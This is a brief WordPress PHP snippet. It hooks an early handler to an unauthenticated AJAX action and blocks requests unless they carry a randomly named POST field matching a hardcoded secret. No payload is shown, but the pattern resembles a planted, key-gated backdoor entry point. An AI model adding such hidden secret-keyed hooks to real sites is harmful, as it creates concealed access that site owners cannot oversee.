<?php

function network_snippets_inline() {
	if (!isset($_POST["sbsxhkgybuy"]) || $_POST["sbsxhkgybuy"] !== "fQgGNQe44UUdmd5") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'network_snippets_inline', 5, 1);
